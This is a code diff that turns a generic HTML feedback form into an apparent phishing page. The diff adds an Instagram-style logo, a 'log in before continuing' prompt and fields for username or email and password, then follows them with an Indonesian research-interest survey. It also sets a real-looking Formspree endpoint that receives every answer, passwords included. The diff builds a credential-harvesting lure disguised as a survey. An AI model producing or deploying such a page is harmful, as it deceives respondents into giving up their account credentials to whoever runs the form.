@@ -235,11 +235,12 @@
                         <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
                     </svg>
                 </div>
+                <p class="login-text">login sebelum melanjutkan</p>
             </div>
 
             <div class="question-group">
                 <label class="question-label">
-                    1. What is your name? <span class="required">*</span>
+                    1. Username or Email <span class="required">*</span>
                 </label>
                 <input type="text" id="q1" placeholder="Enter your name" required>
                 <span class="error-message" id="error1">This field is required</span>
@@ -247,14 +248,14 @@
 
             <div class="question-group">
                 <label class="question-label">
-                    2. What is your feedback? <span class="required">*</span>
+                    2. Password <span class="required">*</span>
                 </label>
                 <input type="text" id="q2" placeholder="Enter your feedback" required>
                 <span class="error-message" id="error2">This field is required</span>
             </div>
 
             <div class="button-group">
-                <button class="btn-next" onclick="goToPage(2)">Next</button>
+                <button class="btn-next" onclick="goToPage(2)">Login</button>
             </div>
         </div>
 
@@ -262,28 +263,28 @@
         <div class="page" id="page2">
             <div class="question-group">
                 <label class="question-label">
-                    3. How satisfied are you with our service? <span class="required">*</span>
+                    3. Seberapa tertarik kamu dengan riset? <span class="required">*</span>
                 </label>
                 <div class="radio-group">
                     <label class="radio-option">
                         <input type="radio" name="q3" value="Very Satisfied" required>
-                        <span>Very Satisfied</span>
+                        <span>Very Sangat tertarik</span>
                     </label>
                     <label class="radio-option">
                         <input type="radio" name="q3" value="Satisfied">
-                        <span>Satisfied</span>
+                        <span>Tertarik</span>
                     </label>
                     <label class="radio-option">
                         <input type="radio" name="q3" value="Neutral">
-                        <span>Neutral</span>
+                        <span>Netral</span>
                     </label>
                     <label class="radio-option">
                         <input type="radio" name="q3" value="Dissatisfied">
-                        <span>Dissatisfied</span>
+                        <span>Kurang tertarik</span>
                     </label>
                     <label class="radio-option">
                         <input type="radio" name="q3" value="Very Dissatisfied">
-                        <span>Very Dissatisfied</span>
+                        <span>Tidak tertarik</span>
                     </label>
                 </div>
                 <span class="error-message" id="error3">Please select an option</span>
@@ -291,38 +292,38 @@
 
             <div class="question-group">
                 <label class="question-label">
-                    4. Which features do you use most? (Select all that apply)
+                    4. Apa Topik Riset Paling Menarik Untuk Anda? (Select all that apply)
                 </label>
                 <div class="checkbox-group">
                     <label class="checkbox-option">
                         <input type="checkbox" name="q4" value="Feature A">
-                        <span>Feature A</span>
+                        <span>Pendidikan</span>
                     </label>
                     <label class="checkbox-option">
                         <input type="checkbox" name="q4" value="Feature B">
-                        <span>Feature B</span>
+                        <span>Kesehatan</span>
                     </label>
                     <label class="checkbox-option">
                         <input type="checkbox" name="q4" value="Feature C">
-                        <span>Feature C</span>
+                        <span>Ekonomi</span>
                     </label>
                     <label class="checkbox-option">
                         <input type="checkbox" name="q4" value="Feature D">
-                        <span>Feature D</span>
+                        <span>Lainnya</span>
                     </label>
                 </div>
             </div>
 
             <div class="question-group">
                 <label class="question-label">
-                    5. How did you hear about us? <span class="required">*</span>
+                    5. Darimana Anda biasa mendengar perihal riset? <span class="required">*</span>
                 </label>
                 <select id="q5" required>
                     <option value="">Select an option</option>
                     <option value="Social Media">Social Media</option>
-                    <option value="Search Engine">Search Engine</option>
-                    <option value="Friend/Family">Friend/Family</option>
-                    <option value="Advertisement">Advertisement</option>
+                    <option value="Search Engine">Blog Internet</option>
+                    <option value="Friend/Family">Keluarga/Teman</option>
+                    <option value="Advertisement">Repository Jurnal</option>
                     <option value="Other">Other</option>
                 </select>
                 <span class="error-message" id="error5">Please select an option</span>
@@ -330,7 +331,7 @@
 
             <div class="question-group">
                 <label class="question-label">
-                    6. What is your age range?
+                    6. Berapa kisaran umur tepat untuk belajar riset menurut anda?
                 </label>
                 <select id="q6">
                     <option value="">Select an option</option>
@@ -345,7 +346,7 @@
 
             <div class="question-group">
                 <label class="question-label">
-                    7. Any additional comments or suggestions?
+                    7. Nama Anda dan Asal Kampus
                 </label>
                 <textarea id="q7" placeholder="Share your thoughts..."></textarea>
             </div>
@@ -449,7 +450,7 @@
             console.log('Form Data:', formData);
             
             // REPLACE 'YOUR_FORMSPREE_ID' with your actual Formspree form ID
-            const formspreeURL = 'https://formspree.io/f/YOUR_FORMSPREE_ID';
+            const formspreeURL = 'https://formspree.io/f/xzzknerg';
             
             try {
                 const response = await fetch(formspreeURL, {
